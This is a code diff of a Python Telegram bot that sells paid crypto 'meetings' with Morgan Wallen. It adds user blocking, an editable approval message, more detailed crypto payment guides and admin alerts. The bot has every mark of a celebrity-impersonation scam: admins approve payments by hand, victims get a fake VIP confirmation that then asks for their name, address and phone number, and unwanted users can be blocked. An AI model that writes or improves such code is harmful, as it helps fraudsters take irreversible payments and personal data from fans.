@@ -34,10 +34,13 @@ def get_btc_amount(usd_amount):
 # ================= DATABASE =================
 conn = sqlite3.connect("bot.db", check_same_thread=False)
 cursor = conn.cursor()
-cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)")
+cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, blocked INTEGER DEFAULT 0)")
 cursor.execute("CREATE TABLE IF NOT EXISTS wallets (coin TEXT PRIMARY KEY, address TEXT, memo TEXT)")
-cursor.execute("CREATE TABLE IF NOT EXISTS settings (id INTEGER PRIMARY KEY, rej_msg TEXT, price_meet INTEGER, price_biz INTEGER)")
-cursor.execute("INSERT OR IGNORE INTO settings (id, price_meet, price_biz) VALUES (1, 15000, 20000)")
+cursor.execute("CREATE TABLE IF NOT EXISTS settings (id INTEGER PRIMARY KEY, rej_msg TEXT, app_msg TEXT, price_meet INTEGER, price_biz INTEGER)")
+
+# Initial setup for messages if they don't exist
+default_app = "🎉 **Payment Confirmed Successfully**\n\n━━━━━━━━━━━━━━━━━━\n👑 **VIP CONFIRMATION NOTICE**\n━━━━━━━━━━━━━━━━━━\n\nDear User,\n\nYour payment has been successfully verified. Your exclusive meeting with **Morgan Wallen** is now officially scheduled.\n\n📅 **Scheduled Date:** {date}\n\n🎫 **VIP Recognition Card:**\nA VIP Fan Card will be issued as your official form of recognition and identification for the meeting. This card will be prepared and shipped to you within the next **2 days**.\n\n📦 **Shipping & Delivery:**\nPersonal details such as your **Full Name, Shipping Address, and Phone Number** must be provided by you once the card is ready for dispatch to ensure a secure delivery.\n\nThank you for your trust. We look forward to delivering a premium experience.\n\n━━━━━━━━━━━━━━━━━━\nStatus: **CONFIRMED ✅**"
+cursor.execute("INSERT OR IGNORE INTO settings (id, price_meet, price_biz, app_msg) VALUES (1, 15000, 20000, ?)", (default_app,))
 conn.commit()
 
 def get_wallet(coin):
@@ -50,9 +53,16 @@ def get_prices():
     res = cursor.fetchone()
     return res if res else (15000, 20000)
 
+def is_blocked(user_id):
+    cursor.execute("SELECT blocked FROM users WHERE user_id=?", (user_id,))
+    row = cursor.fetchone()
+    return row[0] == 1 if row else False
+
 # ================= START =================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    if is_blocked(user_id): return
+
     cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
     conn.commit()
 
@@ -76,8 +86,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ================= CALLBACKS =================
 async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    await query.answer()
     user_id = query.from_user.id
+    if not is_admin(user_id) and is_blocked(user_id): return
+    
+    await query.answer()
     data = query.data
 
     if data.startswith("copy_"):
@@ -89,12 +101,19 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "admin_panel" and is_admin(user_id):
         cursor.execute("SELECT COUNT(*) FROM users")
         count = cursor.fetchone()[0]
-        kb = [[InlineKeyboardButton("💰 Edit Prices", callback_data="edit_prices")],
-              [InlineKeyboardButton("💳 Edit Wallets/Bank", callback_data="wallet_menu")],
-              [InlineKeyboardButton("💬 DM a User", callback_data="dm_user")],
-              [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")],
-              [InlineKeyboardButton("📝 Edit Rejection Msg", callback_data="set_rej_msg")]]
+        kb = [[InlineKeyboardButton("💰 Prices", callback_data="edit_prices"), InlineKeyboardButton("💳 Wallets", callback_data="wallet_menu")],
+              [InlineKeyboardButton("💬 DM User", callback_data="dm_user"), InlineKeyboardButton("🚫 Block User", callback_data="block_menu")],
+              [InlineKeyboardButton("✅ Edit Approval", callback_data="set_app_msg"), InlineKeyboardButton("❌ Edit Reject", callback_data="set_rej_msg")],
+              [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")]]
         await query.edit_message_text(f"📊 **Admin Panel**\nTotal Active Users: `{count}`", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
+
+    elif data == "block_menu" and is_admin(user_id):
+        context.user_data["step"] = "blocking_id"
+        await query.edit_message_text("🚫 Send the **User ID** to Block/Unblock:")
+
+    elif data == "set_app_msg" and is_admin(user_id):
+        context.user_data["step"] = "setting_app_msg"
+        await query.edit_message_text("📥 Send the new **Approval Message** (Use {date} where the date should go):")
 
     elif data == "wallet_menu" and is_admin(user_id):
         kb = [[InlineKeyboardButton("BTC", callback_data="manage_BTC"), InlineKeyboardButton("ETH", callback_data="manage_ETH")],
@@ -117,7 +136,6 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["step"] = "dm_id"
         await query.edit_message_text("🆔 Send the **User ID** you want to message:")
 
-    # NEW: Quick Reply Button handler
     elif data.startswith("reply_") and is_admin(user_id):
         target = data.split("_")[1]
         context.user_data["target_dm"] = target
@@ -150,15 +168,22 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data.startswith("guide_"):
         coin = data.split("_")[1]
+        # PROFESSIONAL GUIDE CONTENT
+        net_info = {
+            "BTC": "Bitcoin Network",
+            "ETH": "Ethereum (ERC20) Network",
+            "USDT": "Tron (TRC20) Network"
+        }.get(coin, "the corresponding network")
+        
         guide_text = (
-            f"📘 **How to Pay with {coin}**\n\n"
-            "1️⃣ Open your crypto exchange or wallet app.\n"
-            f"2️⃣ Tap **Send** or **Withdraw** and choose **{coin}**.\n"
-            "3️⃣ Select the correct **Network** (Critical!).\n"
-            "4️⃣ Paste the exact Wallet Address from your invoice.\n"
-            "5️⃣ Add the **Memo/Tag** (ONLY if your invoice shows one).\n"
-            "6️⃣ Enter the exact amount, cover any network fees, and send.\n\n"
-            "⚠️ **IMPORTANT:** Always double-check the network and address before confirming."
+            f"📘 **Official {coin} Payment Guide**\n\n"
+            f"To complete your booking, please follow these professional steps to ensure your {coin} transfer is successful:\n\n"
+            "1️⃣ **Access Your Wallet:** Open your preferred Cryptocurrency exchange (Bybit, Binance, Coinbase) or personal wallet (Trust Wallet, Ledger).\n\n"
+            f"2️⃣ **Initiate Transfer:** Select **Withdraw** or **Send** and choose **{coin}** from your asset list.\n\n"
+            f"3️⃣ **Select Network:** This is a critical step. Ensure you select the **{net_info}**. Sending funds via the wrong network will result in a permanent loss of funds.\n\n"
+            "4️⃣ **Recipient Details:** Copy the Wallet Address provided in your invoice and paste it into the recipient field. If your invoice includes a **Memo/Tag**, you MUST include it.\n\n"
+            "5️⃣ **Finalize:** Enter the exact amount shown on your invoice, review the transaction, and tap **Confirm**.\n\n"
+            "⚠️ **Note:** Transfers typically take 10-30 minutes to reflect on the blockchain. Once you receive a 'Success' notification in your wallet, click the **Confirm Payment** button below."
         )
         await query.message.reply_text(guide_text, parse_mode="Markdown")
 
@@ -176,10 +201,10 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data.startswith("pay_"):
         coin = data.split("_")[1]
-        user = query.from_user
+        reason = context.user_data.get("reason_text", "No reason provided")
         if not is_admin(user_id):
             for admin in ADMIN_IDS:
-                try: await context.bot.send_message(chat_id=admin, text=f"💳 **Payment Activity!**\nUser: {user.first_name}\nAction: Viewing **{coin}**.")
+                try: await context.bot.send_message(chat_id=admin, text=f"💳 **Activity**\nUser: {user_id}\nCoin: {coin}\nReason: {reason}")
                 except: pass
 
         p_meet, p_biz = get_prices()
@@ -202,30 +227,35 @@ async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.message.reply_text(f"🧾 **Invoice**\nType: {m_type}\nAmount: {display_price}\nCoin: {display_coin}\n\n📍 **Address:**\n`{addr}`{m_txt}", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
 
     elif data == "confirm_payment":
+        reason = context.user_data.get("reason_text", "N/A")
         for admin in ADMIN_IDS:
             kb = [[InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}")],
                   [InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")]]
-            await context.bot.send_message(chat_id=admin, text=f"🧾 **Payment Alert**\nUser: {user_id}", reply_markup=InlineKeyboardMarkup(kb))
+            await context.bot.send_message(chat_id=admin, text=f"🧾 **Payment Alert**\nUser: `{user_id}`\nReason: {reason}", reply_markup=InlineKeyboardMarkup(kb))
         await query.edit_message_text("⏳ Awaiting admin approval...")
 
     elif data.startswith("approve_") and is_admin(user_id):
         target = int(data.split("_")[1])
+        cursor.execute("SELECT app_msg FROM settings WHERE id=1")
+        row = cursor.fetchone()
         meeting_date = (datetime.now() + timedelta(days=5)).strftime('%Y-%m-%d %H:%M')
-        vip_message = "🎉 **Payment Confirmed Successfully**\n\n━━━━━━━━━━━━━━━━━━\n👑 **VIP CONFIRMATION NOTICE**\n━━━━━━━━━━━━━━━━━━\n\nDear User,\n\nYour payment has been successfully verified. Your exclusive meeting with **Morgan Wallen** is now officially scheduled.\n\n📅 **Scheduled Date:** {0}\n\n🎫 **VIP Recognition Card:**\nA VIP Fan Card will be issued as your official form of recognition and identification for the meeting. This card will be prepared and shipped to you within the next **2 days**.\n\n📦 **Shipping & Delivery:**\nPersonal details such as your **Full Name, Shipping Address, and Phone Number** must be provided by you once the card is ready for dispatch to ensure a secure delivery.\n\nThank you for your trust. We look forward to delivering a premium experience.\n\n━━━━━━━━━━━━━━━━━━\nStatus: **CONFIRMED ✅**".format(meeting_date)
-        await context.bot.send_message(chat_id=target, text=vip_message, parse_mode="Markdown")
+        final_msg = row[0].replace("{date}", meeting_date) if row else "Confirmed."
+        await context.bot.send_message(chat_id=target, text=final_msg, parse_mode="Markdown")
         await query.edit_message_text(f"✅ Approved for {target}")
 
     elif data.startswith("reject_") and is_admin(user_id):
         target = int(data.split("_")[1])
         cursor.execute("SELECT rej_msg FROM settings WHERE id=1")
         row = cursor.fetchone()
-        rej_txt = row[0] if row and row[0] else "❌ **Payment Not Received**\n\nWe were unable to verify your transaction. Please check your details and try again."
+        rej_txt = row[0] if row and row[0] else "❌ Payment Not Received."
         await context.bot.send_message(chat_id=target, text=rej_txt, parse_mode="Markdown")
         await query.edit_message_text(f"❌ Rejected for {target}")
 
 # ================= HANDLERS =================
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    if not is_admin(user_id) and is_blocked(user_id): return
+    
     text = update.message.text
     step = context.user_data.get("step")
 
@@ -237,28 +267,43 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             conn.commit()
             await update.message.reply_text(f"✅ {coin} {field} saved!")
         
+        elif step == "blocking_id":
+            target = int(text)
+            cursor.execute("SELECT blocked FROM users WHERE user_id=?", (target,))
+            row = cursor.fetchone()
+            new_status = 1 if row and row[0] == 0 else 0
+            cursor.execute("UPDATE users SET blocked = ? WHERE user_id = ?", (new_status, target))
+            conn.commit(); context.user_data["step"] = None
+            status_txt = "BLOCKED 🚫" if new_status == 1 else "UNBLOCKED ✅"
+            await update.message.reply_text(f"User {target} is now {status_txt}")
+
+        elif step == "setting_app_msg":
+            cursor.execute("UPDATE settings SET app_msg = ? WHERE id = 1", (text,))
+            conn.commit(); context.user_data["step"] = None
+            await update.message.reply_text("✅ Approval Message updated!")
+
         elif step == "setp_meet":
             cursor.execute("UPDATE settings SET price_meet = ? WHERE id = 1", (int(text),))
             conn.commit(); context.user_data["step"] = None
-            await update.message.reply_text(f"✅ Meet & Greet price set to ${text}")
+            await update.message.reply_text(f"✅ Price updated!")
 
         elif step == "setp_biz":
             cursor.execute("UPDATE settings SET price_biz = ? WHERE id = 1", (int(text),))
             conn.commit(); context.user_data["step"] = None
-            await update.message.reply_text(f"✅ Business price set to ${text}")
+            await update.message.reply_text(f"✅ Price updated!")
 
         elif step == "dm_id":
             context.user_data["target_dm"] = text
             context.user_data["step"] = "dm_msg"
-            await update.message.reply_text(f"📝 Now send the message for user `{text}`:")
+            await update.message.reply_text(f"📝 Send message for `{text}`:")
 
         elif step == "dm_msg":
             target = context.user_data.pop("target_dm")
             context.user_data["step"] = None
             try:
                 await context.bot.send_message(chat_id=target, text=text, parse_mode="Markdown")
-                await update.message.reply_text("✅ Message sent!")
-            except: await update.message.reply_text("❌ User blocked bot or ID wrong.")
+                await update.message.reply_text("✅ Sent!")
+            except: await update.message.reply_text("❌ Error sending.")
 
         elif step == "setting_rej_msg":
             cursor.execute("UPDATE settings SET rej_msg = ? WHERE id = 1", (text,))
@@ -266,7 +311,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("✅ Rejection Message saved!")
 
         elif step == "broadcasting":
-            cursor.execute("SELECT user_id FROM users")
+            cursor.execute("SELECT user_id FROM users WHERE blocked=0")
             for (u,) in cursor.fetchall():
                 try: await context.bot.send_message(chat_id=u, text=text)
                 except: pass
@@ -274,6 +319,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("📢 Broadcast sent!")
 
     elif step == "reason":
+        context.user_data["reason_text"] = text
         context.user_data["step"] = None
         kb = [[InlineKeyboardButton("BTC", callback_data="pay_BTC")], 
               [InlineKeyboardButton("ETH (Ethereum ERC20)", callback_data="pay_ETH")], 
@@ -281,19 +327,11 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
               [InlineKeyboardButton("Bank Transfer", callback_data="pay_Bank")]]
         await update.message.reply_text("Choose payment method:", reply_markup=InlineKeyboardMarkup(kb))
     
-    # NEW: Forward any regular text from users directly to Admin
     elif not is_admin(user_id):
-        user = update.effective_user
-        username = f"@{user.username}" if user.username else "No Username"
         for admin in ADMIN_IDS:
             try:
                 kb = [[InlineKeyboardButton("↩️ Reply", callback_data=f"reply_{user_id}")]]
-                await context.bot.send_message(
-                    chat_id=admin, 
-                    text=f"📩 **New Message**\n👤 {user.first_name} ({username})\n🆔 `{user_id}`\n\n💬 {text}",
-                    reply_markup=InlineKeyboardMarkup(kb),
-                    parse_mode="Markdown"
-                )
+                await context.bot.send_message(chat_id=admin, text=f"📩 **Message from {user_id}**\n\n💬 {text}", reply_markup=InlineKeyboardMarkup(kb))
             except: pass
 
 if __name__ == "__main__":
